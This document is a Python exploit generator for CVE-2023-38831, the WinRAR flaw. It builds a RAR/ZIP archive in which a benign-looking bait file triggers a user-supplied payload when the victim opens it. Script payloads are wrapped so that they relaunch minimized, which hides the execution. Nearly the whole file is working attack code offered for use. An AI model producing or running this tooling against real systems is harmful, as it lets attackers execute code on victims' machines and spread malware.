# Exploit for CVE-2023-38831 - WinRAR Arbitrary Code Execution (Created by technical_corp)
# This exploit generates a malicious RAR archive that can execute arbitrary code on a victim's machine.

import os, sys
from os.path import join
import shutil
import argparse

global template_folder
global bait_filename
global payload_filename
global output_filename

def clean_up():
    print("[+] Cleaning up temporary files...")
    if os.path.exists("Modified_" + payload_filename):
        os.remove("Modified_" + payload_filename)
    if os.path.exists(template_folder):
        shutil.rmtree(template_folder)
    if os.path.exists(template_folder + ".zip"):
        os.remove(template_folder + ".zip")
        print("[+] Deleted the temporary zip file.")

print(r"""   ___   __   __   ___             ___      __     ___     ____            ____    ___     ___     ____     _    
  / __|  \ \ / /  | __|    ___    |_  )    /  \   |_  )   |__ /    ___    |__ /   ( _ )   ( _ )   |__ /    / |   
 | (__    \ V /   | _|    |___|    / /    | () |   / /     |_ \   |___|    |_ \   / _ \   / _ \    |_ \    | |   
  \___|    \_/    |___|           /___|   _\__/   /___|   |___/           |___/   \___/   \___/   |___/    |_| BY technical_corp.

RARLabs WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive.
This was exploited in the wild in April through August 2023.
""")

# Parse arguments for bait file, payload file, and output file
parser = argparse.ArgumentParser()
parser.add_argument("-b", "--bait-file", dest="bait_filename", type=str, required=True, help="Specify the bait file (e.g., 'bait.pdf').")
parser.add_argument("-p", "--payload-file", dest="payload_filename", type=str, required=True, help="Specify the payload file (e.g., 'commands.cmd' or 'payload.pdf').")
parser.add_argument("-o", "--output-file", dest="output_filename", type=str, default="output.rar", help="Specify the output RAR file (default: 'output.rar').")

args = parser.parse_args()

template_folder = "template_folder"
bait_filename = args.bait_filename
payload_filename = args.payload_filename
output_filename = args.output_filename

# Cleanup any previous temporary files
clean_up()

# Check if the payload is a script (bat/cmd), binary (exe), or PDF
if args.payload_filename.split(".")[-1] in ["bat", "cmd"]:
    filetype = ""
    cmd_template = r"""if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
=====PAYLOAD=====
exit
"""
elif args.payload_filename.split(".")[-1] == "pdf":
    filetype = "b"  # PDF will be treated as a binary file
else:
    filetype = "b"

# Read the content of the payload file
try:
    print(f"[+] Reading content from {args.payload_filename}")
    with open(args.payload_filename, "r" + filetype) as f:
        content = f.read()
except:
    print("[X] Payload file not found...")
    sys.exit()

# Create a modified payload file for scripts (bat/cmd)
try:
    modified_payload_filename = "Modified_" + args.payload_filename
    if filetype == "":
        print(f"[+] Creating modified payload script ({modified_payload_filename})")
        with open(modified_payload_filename, "w") as f:
            cmd = cmd_template.replace("=====PAYLOAD=====", content)
            f.write(cmd)
    else:
        with open(modified_payload_filename, "w" + filetype) as f:
            f.write(content)
except:
    print("[X] Failed to create modified payload file...")
    sys.exit()

# Extract the extension from the bait file
original_ext = b"." + bytes(args.bait_filename.split(".")[-1], "utf-8")
ext_payload_filename = payload_filename.split(".")[-1]

# Create a new folder for the malicious archive
try:
    print("[+] Creating a new folder for the malicious archive...")
    os.mkdir(template_folder)
    d = join(template_folder, args.bait_filename + "A")
    if not os.path.exists(d):
        os.mkdir(d)
except:
    print("[X] Failed to create the template folder...")
    sys.exit()

# Copy the modified payload (script or PDF) and the bait file to the new folder
try:
    print("[+] Copying the modified payload and bait file...")
    shutil.copyfile(join(modified_payload_filename), join(d, args.bait_filename + "A." + ext_payload_filename))
    shutil.copyfile(join(args.bait_filename), join(template_folder, args.bait_filename + "B"))
except Exception as e:
    print(f"[X] Failed to copy files: {e}")
    sys.exit()

# Create a zip file from the folder
try:
    print("[+] Creating the malicious ZIP file...")
    shutil.make_archive(template_folder, 'zip', template_folder)
    with open(template_folder + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(original_ext + b"A", original_ext + b" ")
        content = content.replace(original_ext + b"B", original_ext + b" ")
except Exception as e:
    print(f"[X] Failed to create the ZIP file: {e}")
    sys.exit()

# Create the final RAR file
try:
    print(f"[+] Writing the final RAR file to {args.output_filename}...")
    with open(args.output_filename, "wb") as f:
        f.write(content)
except:
    print("[X] Failed to create the RAR file...")
    sys.exit()

# Cleanup temporary files
clean_up()

print(f"[+] Exploit created successfully: {output_filename}")
